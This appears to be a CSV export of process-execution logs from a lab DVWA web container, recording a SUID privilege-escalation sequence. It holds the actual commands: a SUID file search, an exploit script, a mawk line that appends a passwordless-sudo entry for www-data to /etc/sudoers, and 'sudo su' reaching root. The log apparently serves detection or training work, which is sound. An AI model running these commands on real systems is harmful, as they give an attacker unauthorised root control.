@timestamp,agent.hostname,command,cwd,event.ingested,filename,host.hostname,host.id,host.ip,host.mac,host.name,host.os.codename,host.os.family,host.os.kernel,host.os.name,host.os.type,host.os.version,message,sid,tty,uid
"Oct 24, 2022 @ 23:21:48.560",dvwa_web,/bin/bash -i,/var/www,"Oct 24, 2022 @ 23:21:49.562",/bin/bash,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:256075 tty:/dev/pts/0 cwd:/var/www filename:/bin/bash]: /bin/bash -i,256075,/dev/pts/0,33
"Oct 24, 2022 @ 23:21:34.557",dvwa_web,su - www-data,/var/www/html,"Oct 24, 2022 @ 23:21:35.559",/bin/su,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/var/www/html filename:/bin/su]: su - www-data,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:21:34.557",dvwa_web,-sh,/var/www,"Oct 24, 2022 @ 23:21:35.559",/bin/sh,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:256075 tty:/dev/pts/0 cwd:/var/www filename:/bin/sh]: -sh,256075,/dev/pts/0,33
"Oct 24, 2022 @ 23:21:34.557",dvwa_web,id -u,/var/www,"Oct 24, 2022 @ 23:21:35.559",/usr/bin/id,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:256075 tty:/dev/pts/0 cwd:/var/www filename:/usr/bin/id]: id -u,256075,/dev/pts/0,33
"Oct 24, 2022 @ 23:21:34.557",dvwa_web,id -u,/var/www,"Oct 24, 2022 @ 23:21:35.559",/usr/bin/id,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:256075 tty:/dev/pts/0 cwd:/var/www filename:/usr/bin/id]: id -u,256075,/dev/pts/0,33
"Oct 24, 2022 @ 23:21:10.554",dvwa_web,./exploit_suid_binary.sh,/exploits/Privilege_Escalation_T1548.001,"Oct 24, 2022 @ 23:21:11.556",./exploit_suid_binary.sh,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:238862 tty:(none) cwd:/exploits/Privilege_Escalation_T1548.001 filename:./exploit_suid_binary.sh]: ./exploit_suid_binary.sh,238862,(none),33
"Oct 24, 2022 @ 23:21:10.554",dvwa_web,find / -perm -u=s -type f,/exploits/Privilege_Escalation_T1548.001,"Oct 24, 2022 @ 23:21:11.556",/usr/bin/find,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:238862 tty:(none) cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/find]: find / -perm -u=s -type f,238862,(none),33
"Oct 24, 2022 @ 23:21:10.554",dvwa_web,"mawk -v LFILE=/etc/sudoers BEGIN { print ""www-data ALL=(ALL) NOPASSWD:ALL"" >> LFILE }",/exploits/Privilege_Escalation_T1548.001,"Oct 24, 2022 @ 23:21:11.556",/usr/bin/mawk,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),"[uid:33 sid:238862 tty:(none) cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/mawk]: mawk -v LFILE=/etc/sudoers BEGIN { print ""www-data ALL=(ALL) NOPASSWD:ALL"" >> LFILE }",238862,(none),33
"Oct 24, 2022 @ 23:21:10.554",dvwa_web,sudo su,/exploits/Privilege_Escalation_T1548.001,"Oct 24, 2022 @ 23:21:11.556",/usr/bin/sudo,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:238862 tty:(none) cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/sudo]: sudo su,238862,(none),33
"Oct 24, 2022 @ 23:21:10.554",dvwa_web,su,/exploits/Privilege_Escalation_T1548.001,"Oct 24, 2022 @ 23:21:11.556",/bin/su,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:238862 tty:(none) cwd:/exploits/Privilege_Escalation_T1548.001 filename:/bin/su]: su,238862,(none),0
